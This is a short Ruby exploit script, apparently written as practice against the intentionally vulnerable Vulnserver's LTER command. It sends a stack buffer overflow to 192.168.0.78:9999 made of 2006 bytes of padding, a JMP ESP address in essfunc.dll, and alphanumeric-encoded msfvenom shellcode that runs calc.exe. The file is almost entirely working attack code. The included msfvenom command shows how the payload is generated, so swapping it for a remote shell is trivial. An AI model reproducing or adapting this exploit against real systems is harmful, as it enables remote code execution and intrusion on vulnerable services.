#!/usr/bin/env ruby

require 'socket'

# host = "192.168.0.78" # ARGV[0]
# port = "9999" # ARGV[1]
# msfvenom -p windows/exec CMD=calc.exe -e x86/alpha_mixed -f ruby -b '\x00\x0a\x0d' BufferRegister=ESP
badHeader = "LTER ."
badData = "\x41" * 2006 # Offset is 2006
badData += "\x03\x12\x50\x62" # Memory Address 0x62501203; # JMP ESP, essfunc.dll
badData +=  "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" +
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" +
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x79\x78" +
"\x6e\x62\x67\x70\x47\x70\x55\x50\x55\x30\x6b\x39\x38\x65" +
"\x35\x61\x6f\x30\x73\x54\x6c\x4b\x30\x50\x74\x70\x4c\x4b" +
"\x73\x62\x64\x4c\x6e\x6b\x51\x42\x76\x74\x6c\x4b\x54\x32" +
"\x47\x58\x66\x6f\x6c\x77\x31\x5a\x44\x66\x54\x71\x49\x6f" +
"\x4c\x6c\x67\x4c\x55\x31\x71\x6c\x63\x32\x66\x4c\x31\x30" +
"\x39\x51\x48\x4f\x74\x4d\x57\x71\x6f\x37\x58\x62\x58\x72" +
"\x62\x72\x71\x47\x4e\x6b\x76\x32\x64\x50\x4c\x4b\x71\x5a" +
"\x35\x6c\x6c\x4b\x52\x6c\x62\x31\x71\x68\x58\x63\x67\x38" +
"\x65\x51\x58\x51\x50\x51\x4c\x4b\x46\x39\x51\x30\x66\x61" +
"\x6e\x33\x4e\x6b\x42\x69\x32\x38\x39\x73\x55\x6a\x42\x69" +
"\x4c\x4b\x64\x74\x4e\x6b\x56\x61\x38\x56\x30\x31\x59\x6f" +
"\x4c\x6c\x39\x51\x5a\x6f\x44\x4d\x56\x61\x49\x57\x75\x68" +
"\x49\x70\x62\x55\x58\x76\x37\x73\x61\x6d\x6c\x38\x45\x6b" +
"\x51\x6d\x67\x54\x73\x45\x69\x74\x32\x78\x6c\x4b\x73\x68" +
"\x37\x54\x33\x31\x79\x43\x33\x56\x4c\x4b\x76\x6c\x62\x6b" +
"\x6e\x6b\x36\x38\x47\x6c\x67\x71\x48\x53\x6e\x6b\x35\x54" +
"\x6c\x4b\x55\x51\x78\x50\x4c\x49\x52\x64\x44\x64\x57\x54" +
"\x33\x6b\x31\x4b\x53\x51\x31\x49\x31\x4a\x46\x31\x79\x6f" +
"\x6b\x50\x43\x6f\x71\x4f\x43\x6a\x4c\x4b\x65\x42\x58\x6b" +
"\x6e\x6d\x51\x4d\x61\x7a\x73\x31\x4e\x6d\x6f\x75\x48\x32" +
"\x73\x30\x75\x50\x43\x30\x42\x70\x63\x58\x46\x51\x6c\x4b" +
"\x50\x6f\x6c\x47\x49\x6f\x79\x45\x4d\x6b\x6a\x50\x48\x35" +
"\x49\x32\x61\x46\x53\x58\x59\x36\x7a\x35\x4d\x6d\x4d\x4d" +
"\x49\x6f\x48\x55\x37\x4c\x57\x76\x61\x6c\x46\x6a\x6f\x70" +
"\x49\x6b\x59\x70\x30\x75\x67\x75\x6f\x4b\x30\x47\x36\x73" +
"\x34\x32\x70\x6f\x62\x4a\x57\x70\x66\x33\x4b\x4f\x78\x55" +
"\x72\x43\x53\x51\x52\x4c\x75\x33\x66\x4e\x55\x35\x72\x58" +
"\x42\x45\x55\x50\x41\x41"

# Config Socket
socket = TCPSocket.open '192.168.0.78', 9999
socket.recv(1024)
socket.send(badHeader + badData, 0)
socket.close